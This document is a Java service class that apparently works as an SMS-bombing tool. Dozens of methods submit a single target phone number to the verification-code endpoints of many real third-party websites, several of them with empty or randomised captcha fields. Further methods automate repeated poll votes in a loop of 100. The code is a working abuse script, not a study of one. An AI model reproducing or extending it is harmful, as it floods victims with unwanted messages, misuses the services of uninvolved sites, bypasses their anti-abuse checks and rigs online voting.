package com.zyportal2.system.serviceImpl;

import com.zyportal2.system.service.SmsService;
import com.zyportal2.system.util.HttpUtils;
import com.zyportal2.system.util.RandomHelper;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Service;

import java.util.HashMap;
import java.util.Map;

/**
 * Created by Thinkpad on 2019/4/4.
 */
@Service("smsService")
public class SmsServiceImpl implements SmsService {

    private static final Logger LOGGER = LoggerFactory.getLogger(SmsServiceImpl.class);

    @Override
    public String test() {
        return "测试";
    }

    @Override
    public void sendinfo1(String mobile) {
        String url = "http://member.cabplink.com/sso/sendRegisterSMS.zaction";
        Map<String, String> param = new HashMap<>();
        param.put("mobile", mobile);
        String str = HttpUtils.sendGet(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo2(String mobile) {
        String url = "http://www.jianxin360.com/Home/Mcore/verification.html";
        Map<String, String> param = new HashMap<>();
        param.put("mt", mobile);
        String str = HttpUtils.sendPost(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo3(String mobile) {
        String url = "http://www.grainnews.com.cn/tools/action_ajax.ashx";
        Map<String, String> param = new HashMap<>();
        param.put("action", "SendSms");
        param.put("mobile", mobile);
        String str = HttpUtils.sendPost(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo4(String mobile) {
        String url = "http://www.isa1751.com/Home/Public/send_phoneCode.html";
        Map<String, String> param = new HashMap<>();
        param.put("phone", mobile);
        String str = HttpUtils.sendPost(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo5(String mobile) {
        String url = "http://jia.hualongxiang.com/register.php?nowtime=" + Long.toString(System.currentTimeMillis()) + "&verify=44d542d6";
        Map<String, String> param = new HashMap<>();
        param.put("action", "auth");
        param.put("step", "1");
        param.put("authmobile", mobile);
        String str = HttpUtils.sendPost(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo6(String mobile) {
        String url = "https://accounts.douban.com/j/mobile/login/request_phone_code";
        Map<String, String> param = new HashMap<>();
        param.put("ck", "");
        param.put("area_code", "+86");
        param.put("number", mobile);
        String str = HttpUtils.sendPost(url, param);
    }

    @Override
    public void sendInfo7(String mobile) {
        String url = "http://www.ptengine.cn/wp-content/themes/ptengine/smsApi.php";
        Map<String, String> param = new HashMap<>();
        param.put("tel", mobile);
        String str = HttpUtils.sendGet(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo8(String mobile) {
        String url = "http://app.syxwnet.com/?app=member&controller=index&action=sendMobileMessage";
        Map<String, String> param = new HashMap<>();
        param.put("mobile", mobile);
        String str = HttpUtils.sendPost(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo9(String mobile) {
        String url = "http://www.bio-equip.com/getcode_all.asp?tag=userReg";
        Map<String, String> param = new HashMap<>();
        param.put("Tel", mobile);
        String str = HttpUtils.sendPost(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo10(String mobile) {
        String url = "http://www.bio-equip.com/getcode_all.asp?tag=userReg";
        Map<String, String> param = new HashMap<>();
        param.put("tel", mobile);
        String str = HttpUtils.sendPost(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo11(String mobile) {
        String url = "http://www.zhrczp.com/index.php?m=Home&c=Members&a=reg_send_sms";
        Map<String, String> param = new HashMap<>();
        param.put("mobile", mobile);
        param.put("geetest_challenge", "");
        param.put("geetest_validate", "");
        param.put("geetest_seccode", "");
        String str = HttpUtils.sendPost(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo12(String mobile) {
        String url = "https://www.365face.cn/sms/sms.php?act=send&flag=register";
        Map<String, String> param = new HashMap<>();
        param.put("mobile", mobile);
        int a = (int) ((Math.random() * 9 + 1) * 1000);
        param.put("seccode", a + "");
        param.put("username", "");
        String str = HttpUtils.sendPost(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo13(String mobile) {
        String url = "http://www.meifei.com/index.php?s=member&c=register&m=sms";
        Map<String, String> param = new HashMap<>();
        param.put("mobile", mobile);
        String str = HttpUtils.sendPost(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo14(String mobile) {
        String url = "http://www.pinganfuwang.com:8888/home/doSendCode.do";
        Map<String, String> param = new HashMap<>();
        param.put("phone", mobile);
        param.put("role", "worker");
        String str = HttpUtils.sendPost(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo15(String mobile) {
        String url = "http://www.njxlmbj.cn/yzImgCodeSMS.jsp";
        Map<String, String> param = new HashMap<>();
        param.put("tel", mobile);
        String str = HttpUtils.sendPost(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo16(String mobile) {
        String url = "http://www.119ks.com/tools/submit_ajax.ashx?action=user_verify_smscode&site=main";
        Map<String, String> param = new HashMap<>();
        param.put("mobile", mobile);
        String str = HttpUtils.sendPost(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo17(String mobile) {
        String url = "http://www.loveliao.com/inc/send_sms_ajax.asp";
        Map<String, String> param = new HashMap<>();
        param.put("phone", mobile);
        String str = HttpUtils.sendGetGb(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo18(String mobile) {
        String url = "https://club.geely.com/club-api/api/sendSmsCode";
        Map<String, String> param = new HashMap<>();
        param.put("phone", mobile);
        param.put("usetype", "2");
        String str = HttpUtils.sendPost(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo19(String mobile) {
        String url = "http://inst.laolai.com/inst-bs/getRegisterVerCode.jspx";
        Map<String, String> param = new HashMap<>();
        param.put("phone", mobile);
        String str = HttpUtils.sendGet(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo20(String mobile) {
        String url = "http://bbs.zhue.com.cn/plugin.php";
        Map<String, String> param = new HashMap<>();
        param.put("id", "she_smscode:smscode");
        param.put("mobile", mobile);
        param.put("z", (int) ((Math.random() * 9 + 1) * 1000) + "");
        param.put("infloat", "yes");
        param.put("handlekey", "smscode");
        param.put("inajax", "1");
        param.put("ajaxtarget", "fwin_content_smscode");
        String str = HttpUtils.sendGet(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo21(String mobile) {
        String url = "http://www.renxinl.com/registerSms";
        Map<String, String> param = new HashMap<>();
        param.put("phone", mobile);
        String str = HttpUtils.sendPost(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo22(String mobile) {
        String url = "http://www.aichezhuan.com/Member/rec/sendphone";
        Map<String, String> param = new HashMap<>();
        param.put("phone", mobile);
        String str = HttpUtils.sendPost(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo23(String mobile) {
        String url = "https://cx.cq-pay.com/austomerAction!yuyueYzm.html";
        Map<String, String> param = new HashMap<>();
        param.put("telPhone", mobile);
        String str = HttpUtils.sendPost(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo24(String mobile) {
        String url = "http://hnu.hndxzk.com:8002/api/Login/SendVerification";
        Map<String, String> param = new HashMap<>();
        param.put("Phone", mobile);
        String str = HttpUtils.sendGet(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo25(String mobile) {
        String url = "http://wuxi.jiwu.com/user!sendMobileYzm.action";
        Map<String, String> param = new HashMap<>();
        param.put("username", mobile);
        param.put("cookie_key", RandomHelper.generateUID());
        param.put("geetest_challenge", "0");
        param.put("geetest_validate", "0");
        param.put("geetest_seccode", "0");
        String str = HttpUtils.sendGet(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo26(String mobile) {
        String url = "http://sms.acadsoc.com.cn/Ajax/Web.UI.Fun.User.aspx";
        Map<String, String> param = new HashMap<>();
        param.put("phone", mobile);
        param.put("imageVerCode", "");
        param.put("__", "SMSCode");
        String str = HttpUtils.sendPost(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo27(String mobile) {
        String url = "https://www.bigdata-expo.cn/usercenter/login/verify";
        Map<String, String> param = new HashMap<>();
        param.put("username", mobile);
        param.put("verify", "");
        param.put("invitation_code", "");
        String str = HttpUtils.sendPost(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo28(String mobile) {
        String url = "http://g.hbrc.com/member/js/jianli.ashx?&t=" + Math.random();
        Map<String, String> param = new HashMap<>();
        param.put("shouji", mobile);
        param.put("type", "duanxinma");
        String str = HttpUtils.sendPost(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo29(String mobile) {
        String url = "http://css.hbca.org.cn:8088/hbcaysl/businessQueryController/getVerifyCode.do";
        Map<String, String> param = new HashMap<>();
        param.put("mobile", mobile);
        String str = HttpUtils.sendPost(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo30(String mobile) {
        String url = "http://168.sms10001.com/hfyAjax.ashx";
        Map<String, String> param = new HashMap<>();
        param.put("username", mobile);
        param.put("action", "yzmCode");
        String str = HttpUtils.sendPost(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo31(String mobile) {
        String url = "https://user.0831home.com/message/Sendcode.html?type=json";
        Map<String, String> param = new HashMap<>();
        param.put("mobile", mobile);
        String str = HttpUtils.sendPost(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo32(String mobile) {
        String url = "https://main.focussend.com/user/sendSms?mobile=" + mobile;
        Map<String, String> param = new HashMap<>();
        param.put("mobile", mobile);
        String str = HttpUtils.sendPost(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void senInfo33(String mobile) {
        String url = "http://www.lgser.com/front/mobile/general/member/genmcode";
        Map<String, String> param = new HashMap<>();
        param.put("mobile", mobile);
        String str = HttpUtils.sendGet(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo34(String mobile) {
        String url = "http://www.csti.cn/uums-user-front/api/user/register/phone/send";
        Map<String, String> param = new HashMap<>();
        param.put("phone", mobile);
        String str = HttpUtils.sendGet(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo35(String mobile) {
        String url = "http://passport2.chaoxing.com/num/phonecode";
        Map<String, String> param = new HashMap<>();
        param.put("needcode", "false");
        param.put("phone", mobile);
        String str = HttpUtils.sendGet(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo36(String mobile) {
        String url = "http://www.dns.com.cn/show/userRegister/sendTellCodeRegister.do";
        Map<String, String> param = new HashMap<>();
        param.put("tell", mobile);
        String str = HttpUtils.sendPost(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo37(String mobile) {
        String url = "http://www.spc.org.cn/getmobilecode";
        Map<String, String> param = new HashMap<>();
        param.put("telphone", mobile);
        param.put("code", (int) ((Math.random() * 9 + 1) * 100000) + "");
        String str = HttpUtils.sendPost(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo38(String mobile) {
        String url = "http://www.51sxue.com/index.php";
        Map<String, String> param = new HashMap<>();
        param.put("app", "member");
        param.put("act", "regPhone");
        param.put("time", Long.toString(System.currentTimeMillis()));
        param.put("phone", mobile);
        param.put("username", mobile);
        String str = HttpUtils.sendPost(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo39(String mobile) {
        String url = "http://www.1ydt.com/api/login/send";
        Map<String, String> param = new HashMap<>();
        param.put("reg", "1");
        param.put("phone", mobile);
        String str = HttpUtils.sendPost(url, param);
        LOGGER.warn(str);
    }

    @Override //自定义内容
    public void sendInfo40(String mobile) {
        String url = "http://www.mrzhuanyun.com/ajax/sendmsg.php";
        Map<String, String> param = new HashMap<>();
        param.put("tel", mobile);
        param.put("content", "您正在使用【转运先生】，您的验证码是：" + (int) ((Math.random() * 9 + 1) * 1000) + ",如非本人操作，请致电转运先生客服。");
        String str = HttpUtils.sendPost(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo41(String mobile) {
        String url = "https://www.baicaio.com/index.php?m=user&a=phone_send";
        Map<String, String> param = new HashMap<>();
        param.put("mobile", mobile);
        String str = HttpUtils.sendPost(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo42(String mobile) {
        String url = "http://hero.kufgame.com/UserCenter/PhoneRandomNumber";
        Map<String, String> param = new HashMap<>();
        param.put("PhoneNumber", mobile);
        String str = HttpUtils.sendPost(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo43(String mobile) {
        String url = "http://lyj.ttgames.net/Member/MemberInfoService.svc/SendSMS";
        Map<String, String> param = new HashMap<>();
        param.put("tel", mobile);
        param.put("templatecode", "1");
        String str = HttpUtils.sendGet(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void sendInfo44(String mobile) {
        String url = "http://www.scscjw.com/action/com.ashx";
        Map<String, String> param = new HashMap<>();
        param.put("veri_phone", mobile);
        param.put("type", "phone_yzm");
        String str = HttpUtils.sendPost(url, param);
        LOGGER.warn(str);
    }

    @Override
    public void close() {
        try {
            String url = "http://vote.dukey.cn/ashx/diy.ashx?ac=wx_vote";
            Map<String, String> param = new HashMap<>();
            param.put("token", "34253E6C9128505557D16D5EEE8036C44652F33A24795F2FE1B919D1C4D2E1B5");
            param.put("projectid", "9848");
            param.put("isgz", "0");
            param.put("action", "qaptcha");
            param.put("shopid", "116731");
            param.put("redirecturl", "");
            String str = HttpUtils.sendPost(url, param);
            LOGGER.warn(str);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public void vote() {
        try {
            String url = "http://shequtong.wxshidai.com/vote/vote";
            Map<String, String> param = new HashMap<>();
            String uuid = RandomHelper.randomStringUpper() + RandomHelper.randomStringUpper();
            param.put("id", "198");
            param.put("optionid", "20");
            String str = HttpUtils.sendPost(url, param);
            LOGGER.warn(str);
            Thread.sleep(3 * 1000); //设置暂停的时间 3 秒
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    public void vote11() {
        try {
            String url = "http://192.168.10.168:8080/cl/orange";
            Map<String, String> param = new HashMap<>();
            param.put("phone", "");
            String str = HttpUtils.sendGet(url, param);
            LOGGER.warn(str);
            Thread.sleep(1* 1000); //设置暂停的时间 3 秒
            String url2 = "http://192.168.10.168:8080/cl/orangeReset";
            HttpUtils.sendGet(url2, param);
            Thread.sleep(1 * 1000); //设置暂停的时间 3 秒
        } catch (Exception e) {
            e.printStackTrace();
        }

    }


    public static void main(String args[]) {
        SmsServiceImpl smsService = new SmsServiceImpl();
        String moible = "";
/*        smsService.sendinfo1(moible);
        smsService.sendInfo2(moible);
        smsService.sendInfo3(moible);
        smsService.sendInfo4(moible);
        smsService.sendInfo5(moible);
        smsService.sendInfo6(moible);
        smsService.sendInfo7(moible);
        smsService.sendInfo8(moible);
        smsService.sendInfo9(moible);*/
        for (int i = 0; i < 100; i++) {
            //*   smsService.close();*/
            smsService.vote11();

        }
    }

}
